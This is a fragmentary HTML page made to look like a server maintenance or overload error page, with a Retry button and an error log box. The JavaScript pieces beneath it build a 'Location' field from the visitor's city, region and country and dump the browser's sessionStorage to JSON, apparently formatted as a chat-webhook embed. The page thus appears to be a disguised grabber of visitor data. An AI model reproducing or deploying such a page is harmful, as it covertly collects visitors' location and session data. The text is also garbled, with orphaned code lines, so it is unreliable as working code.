  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
    
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      background: #0f0f1a;
      color: #ff6b6b;
      font-family: 'Inter', sans-serif;
      line-height: 1.6;
      padding: 20px;
      overflow-y: scroll;
      min-height: 100vh;
    }
    
    .container {
      max-width: 900px;
      margin: 40px auto;
      background: #0a0a14;
      border: 1px solid #2a2a40;
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 0 30px rgba(255, 107, 107, 0.25);
    }
    
    h1 {
      font-size: 48px;
      text-align: center;
      margin-bottom: 20px;
      color: #ff3333;
      text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
    }
    
    .subtitle {
      text-align: center;
      font-size: 18px;
      color: #ff8080;
      margin-bottom: 40px;
    }
    
    .error-list {
      background: #0d0d1a;
      border: 1px dashed #ff3333;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 30px;
      font-family: 'Courier New', monospace;
      color: #ffb3b3;
      font-size: 14px;
      white-space: pre-wrap;
      max-height: 500px;
      overflow-y: auto;
    }
    
    .footer {
      text-align: center;
      color: #555;
      font-size: 12px;
      margin-top: 50px;
    }
    
    .blink {
      animation: blink 1.2s infinite;
    }
    
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    .retry-btn {
      display: block;
      width: 200px;
      margin: 30px auto;
      padding: 12px 24px;
      background: #ff3333;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px rgba(255, 51, 51, 0.4);
    }
    
    .retry-btn:hover {
      background: #ff1a1a;
      transform: scale(1.05);
      box-shadow: 0 0 25px rgba(255, 26, 26, 0.6);
    }
  </style>
</head>

    <p class="subtitle">The server is temporarily unable to handle the request due to maintenance or overload.</p>
    
    <button class="retry-btn" onclick="location.reload()">Retry</button>
    
    <div class="error-list" id="errorLog"></div>

      return arr[Math.floor(Math.random() * arr.length)];
    }

        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})`, inline: false },

        const ss = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
